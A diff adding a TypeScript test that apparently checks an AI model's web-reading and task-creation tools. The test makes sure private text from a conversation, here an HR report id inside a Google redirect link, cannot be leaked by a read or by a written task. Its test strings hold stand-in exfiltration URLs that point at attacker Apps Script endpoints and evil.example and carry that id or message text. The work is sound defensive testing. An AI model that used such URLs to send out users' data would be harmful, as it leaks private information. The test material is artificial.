@@ -480,3 +480,32 @@ describe('flux_read_web: the check after the evaluation of #1139', () => {
     await scene.complete(run.runId);
   });
 });
+
+// The independent evaluation of #1139, round 2: a subdomain made www.google.com's links lend their text to script.google.com. Only the pair
+// github.com and api.github.com is one site now.
+describe('flux_read_web: no Google host lends a www.google.com link its site (#1139 round 2)', () => {
+  let scene: AssistantScene;
+  before(async () => { scene = await assistantScene('wz'); });
+  beforeEach(async () => { await scene.reset(); await fetch(`${SITE}/__reset`); });
+
+  test('a wrapped target\'s id goes to no Apps Script, by a read or by a change; a person\'s link and a wrapper copied whole are still written', async () => {
+    const wrapped = 'https://www.google.com/url?q=https://intra.example/hr/report-4711-2026-B77&sa=D';
+    expectStatusPost(await scene.peer.browser.request('POST', `/api/v1/conversations/${scene.thread.id}/messages`,
+      { body: { body: `HR: ${wrapped} and the camera fails below 5 lux. Notes at ${at('/read/notes')}`, clientMessageId: randomUUID() } }));
+    const run = await scene.liveRun(undefined, 'Look at the HR report');
+    const talk = await run.call('flux_get_conversation', { projectId: scene.place.id, id: scene.thread.id });
+    assert.equal(result(talk.message)?.isError, undefined, text(talk.message).slice(0, 300));
+    for (const url of ['https://script.google.com/macros/s/AKfycbAttacker/exec/intra.example/hr/report-4711-2026-B77',
+      'https://script.google.com/macros/s/AKfycbAttacker/exec/report-4711-2026-B77', 'https://evil.example/exec/intra.example/hr/report-4711-2026-B77',
+      'https://script.google.com/macros/s/AKfycbAttacker/exec?d=report-4711-2026-B77'])
+      assert.equal(code((await reading(run, url)).message), 'WEB_READ_PRIVATE_TEXT', url);
+    for (const [outcome, wanted] of [[`The notes: ${at('/read/notes')}`, undefined], [`HR: ${wrapped}`, undefined],
+      ['See https://evil.example/c?d=the%20camera%20fails%20below', 'CHANGE_PRIVATE_ADDRESS'],
+      ['See https://script.google.com/macros/s/AKfycbAttacker/exec/report-4711-2026-B77', 'CHANGE_PRIVATE_ADDRESS']] as const) {
+      const made = await run.call('flux_create_task', { task: { title: `Probe ${randomUUID().slice(0, 8)}`, outcome } });
+      assert.equal(result(made.message)?.isError ? code(made.message) : undefined, wanted, `${outcome}: ${text(made.message).slice(0, 200)}`);
+    }
+    assert.deepEqual(await hits('/'), [], 'nothing was fetched');
+    await scene.complete(run.runId);
+  });
+});
